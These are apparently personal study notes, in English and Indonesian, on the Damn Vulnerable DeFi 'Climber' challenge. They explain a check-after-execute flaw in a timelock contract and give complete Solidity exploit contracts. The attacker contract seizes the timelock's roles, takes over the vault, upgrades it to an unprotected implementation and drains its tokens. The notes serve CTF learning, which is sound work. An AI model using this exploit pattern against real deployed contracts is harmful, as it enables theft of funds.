# Climber Notes(wrote by myself)

- related files: src/climber/, test/climber/

---

### 1. Bug = 
- Check after effects - execute()
- missing access control - execute()
- "execute runs the calls first, then checks if the operation was scheduled."
---

### 2. where? =
- /home/gevariel/dev/damn-vulnerable-defi/src/climber/ClimberTimelock.sol
- 71-99

### 3. leaks reason :
- Core function (execute) punya dua celah sekaligus: nggak ada access control + ngecek otorisasi setelah efeknya udah jalan.

### 4. how we breach it :
- create own upgradeable contract 
```solidity
// =====================================================================
// "otak jahat" pengganti. kita upgrade vault ke sini.
// sama kayak sweepFunds asli, TAPI tanpa onlySweeper & tujuan bebas.
// =====================================================================
contract PawnedVault is UUPSUpgradeable {
    function sweepAll(address token, address to) external {
        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
    }

    // wajib ada biar kontrak ini valid sbg implementasi UUPS. kosongin = siapa pun boleh upgrade.
    function _authorizeUpgrade(address) internal override {}
}
```

- attacking contract(constructor setup,function)
``` solidity
contract ClimberAttacker {
    ClimberTimelock timelock;
    ClimberVault vault;
    address token;
    address recovery;

    // batch (si "tabel"). disimpen di storage biar scheduleSelf bisa pakai yg sama persis.
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt = bytes32("gevariel");

    constructor(ClimberTimelock _timelock, ClimberVault _vault, address _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        // ---- susun batch (4 baris tabel) ----

        // baris 0: timelock.updateDelay(0) -> operasi langsung "siap", ga nunggu 1 jam
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        // baris 1: timelock.grantRole(PROPOSER, kontrakGue) -> biar boleh manggil schedule
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)));

        // baris 2: vault.transferOwnership(kontrakGue) -> biar bisa upgrade vault nanti
        targets.push(address(vault));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", address(this)));

        // baris 3: kontrakGue.scheduleSelf() -> "cetak tiket": schedule batch ini sendiri
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("scheduleSelf()"));

        // ---- tembak execute. jalan dulu, dicek belakangan (itu bugnya) ----
        timelock.execute(targets, values, dataElements, salt);
        // ---- skrg kontrak ini OWNER vault. ganti otak vault -> PawnedVault, lgsg sweep ----
        PawnedVault evil = new PawnedVault();
        vault.upgradeToAndCall(address(evil), abi.encodeWithSignature("sweepAll(address,address)", token, recovery));
    }

    // dipanggil oleh timelock (dari dalam execute). argumennya PERSIS sama -> id cocok -> lolos cek.
    function scheduleSelf() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}

```


